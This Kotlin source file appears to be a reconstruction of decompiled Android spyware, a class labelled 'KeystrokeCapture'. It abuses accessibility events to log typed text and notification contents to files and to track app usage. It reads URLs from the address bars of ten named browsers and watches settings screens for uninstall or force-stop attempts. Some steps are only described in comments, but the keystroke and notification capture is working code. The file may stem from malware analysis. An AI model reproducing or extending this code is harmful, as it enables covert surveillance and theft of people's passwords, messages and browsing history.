package com.storm.safe.rock.service.modules

import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Auto-grant permissions via accessibility, monitors app usage, browser URLs.
 *
 * Reverse-engineered from JADX: C0320a5 (a5, 309 lines).
 * Renamed: a0→collectNodeTexts, a1→getAppName, a2→onWindowChanged,
 *          a3→handleEvent, a4→processTextEvent
 *
 * JADX name: KeystrokeCapture
 */
class PermissionAutoGrantDelegate(
    // vendor: constructor takes dqtvuisjd (service reference) — not held here for testability
) {
    companion object {
        private const val TAG = "KeystrokeCapture"

        /** Browser package → URL bar resource ID map */
        val BROWSER_URL_BAR_IDS: Map<String, String> = mapOf(
            "com.android.chrome" to "com.android.chrome:id/url_bar",
            "org.mozilla.firefox" to "org.mozilla.firefox:id/url_bar_title",
            "com.sec.android.app.sbrowser" to "com.sec.android.app.sbrowser:id/location_bar_edit_text",
            "com.brave.browser" to "com.brave.browser:id/url_bar",
            "com.opera.browser" to "com.opera.browser:id/url_field",
            "com.opera.mini.native" to "com.opera.mini.native:id/url_field",
            "com.microsoft.emmx" to "com.microsoft.emmx:id/url_bar",
            "com.coloros.browser" to "com.coloros.browser:id/azt",
            "com.android.browser" to "com.android.browser:id/url",
            "com.duckduckgo.mobile.android" to "com.duckduckgo.mobile.android:id/omnibarTextInput"
        )

        /** Settings packages that trigger monitoring */
        private val SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            // vendor: also includes StringUtil-decoded packages:
            // "com.bbk.VivoSafe" and obfuscated Samsung/Huawei settings packages
            "com.bbk.VivoSafe",
            "com.samsung.android.sm"
        )

        /**
         * Recursively collect text and contentDescription from node tree.
         * JADX: a0 (static)
         */
        @JvmStatic
        fun collectNodeTexts(maxDepth: Int, node: AccessibilityNodeInfo?, results: ArrayList<String>) {
            if (maxDepth <= 0 || node == null) return
            node.text?.toString()?.takeIf { it.isNotBlank() }?.let { results.add(it) }
            node.contentDescription?.toString()?.takeIf { it.isNotBlank() }?.let { results.add(it) }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    collectNodeTexts(maxDepth - 1, child, results)
                    child.recycle()
                }
            }
        }
    }

    // --- Instance fields ---
    private var lastPackage: String = ""
    private var lastContent: String = ""
    private var lastSettingsCheckTime: Long = 0L
    private val appNameCache = ConcurrentHashMap<String, String>()
    private val cacheInitialized = AtomicBoolean(false)

    // --- a1 → getAppName ---
    fun getAppName(packageName: String): String {
        val cached = appNameCache[packageName]
        if (cached != null) return cached
        // vendor: loads SharedPreferences("app_name_cache") on first call via CAS guard (f53082a5),
        // then queries PackageManager.getApplicationLabel for unknown packages.
        // Without service context, falls back to last segment of package name.
        val shortName = packageName.substringAfterLast(".")
        return shortName
    }

    // --- a2 → onWindowChanged ---
    fun onWindowChanged(packageName: String, appName: String) {
        if (ActivityMonitor.appUsageEnabled && packageName != lastPackage) {
            if (lastPackage.isNotEmpty()) {
                ActivityMonitor.logAppUsage(getAppName(lastPackage), false)
            }
            ActivityMonitor.logAppUsage(appName, true)
            lastPackage = packageName
        }

        // Check settings pages for dangerous operations
        if (SETTINGS_PACKAGES.contains(packageName)) {
            val now = System.currentTimeMillis()
            if (now - lastSettingsCheckTime >= 10000) {
                lastSettingsCheckTime = now
                // vendor: calls service.getRootInActiveWindow(), collectNodeTexts(3, root, list),
                // then checks for keywords: 卸载/uninstall, 清除数据/clear data, 清除缓存/clear cache,
                // 强行停止/force stop, 应用信息/app info — logs detection via ActivityMonitor.
                // Requires service reference (dqtvuisjd) for getRootInActiveWindow().
            }
        }

        // Check browser URL bars
        if (ActivityMonitor.urlMonitorEnabled && BROWSER_URL_BAR_IDS.containsKey(packageName)) {
            // vendor: calls service.getRootInActiveWindow(), finds URL bar node by resource ID,
            // reads text, reports URL via ActivityMonitor.m211547a9(appName, url) if starts with "http" or contains ".".
            // Requires service reference (dqtvuisjd) for getRootInActiveWindow().
        }
    }

    // --- a3 → handleEvent ---
    // JADX: C0320a5.m211582a3 (lines 210-259)
    fun handleEvent(event: AccessibilityEvent, sourceNode: AccessibilityNodeInfo?) {
        val pkg = event.packageName?.toString() ?: return

        if (!ActivityMonitor.textMonitorEnabled && !ActivityMonitor.smsInterceptActive
            && !ActivityMonitor.appUsageEnabled && !ActivityMonitor.urlMonitorEnabled
            && !ActivityMonitor.focusMonitorEnabled) return

        val appName = getAppName(pkg)
        try {
            val eventType = event.eventType

            // TYPE_VIEW_TEXT_CHANGED (16) — keystroke capture
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && (ActivityMonitor.textMonitorEnabled || ActivityMonitor.smsInterceptActive)
            ) {
                val source = sourceNode ?: event.source ?: return
                processTextEvent(source, appName, eventType)
                if (sourceNode == null) source.recycle()
            }

            // TYPE_WINDOW_STATE_CHANGED (32) — app switch + URL + settings detection
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                onWindowChanged(pkg, appName)
            }

            // TYPE_NOTIFICATION_STATE_CHANGED (64) — notification content capture
            // JADX: C0320a5.java lines 234-254, event type 64, writes to NTFS
            // FIX: was incorrectly using TYPE_VIEW_FOCUSED (8)
            if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
                && ActivityMonitor.focusMonitorEnabled
            ) {
                try {
                    val texts = event.text
                    if (texts == null || texts.isEmpty()) return
                    val firstText = texts.firstOrNull()?.toString() ?: ""
                    val allText = if (texts.size > 1) {
                        texts.drop(1).joinToString(" ") { it?.toString() ?: "" }
                    } else ""

                    if (firstText.isNotEmpty() || allText.isNotEmpty()) {
                        ActivityMonitor.writeToFile(
                            ActivityMonitor.LogType.NTFS,
                            "[$appName] $firstText: $allText"
                        )
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.w(TAG, "处理事件失败: ${e.message}")
        }
    }

    // --- a4 → processTextEvent ---
    fun processTextEvent(node: AccessibilityNodeInfo, appName: String, eventType: Int) {
        try {
            val text = node.text?.toString()
                ?: node.contentDescription?.toString()
                ?: return
            val cleaned = text.replace("", "").trim()
            if (cleaned.isEmpty() || cleaned == lastContent) return
            lastContent = cleaned
            val eventName = when (eventType) {
                1 -> "CLICKED"
                2 -> "LONG_CLICKED"
                4 -> "SELECTED"
                8 -> "FOCUSED"
                16 -> "TEXT_CHANGED"
                32 -> "WINDOW_CHANGED"
                64 -> "NOTIFICATION"
                128 -> "HOVER_ENTER"
                256 -> "HOVER_EXIT"
                else -> "EVENT_$eventType"
            }
            val logEntry = "$appName|$eventName|$cleaned"
            if (ActivityMonitor.textMonitorEnabled) {
                ActivityMonitor.writeToFile(ActivityMonitor.LogType.KSTR, logEntry)
            }
        } catch (e: Exception) {
            Log.w(TAG, "processTextEvent 异常: ${e.message}")
        }
    }
}
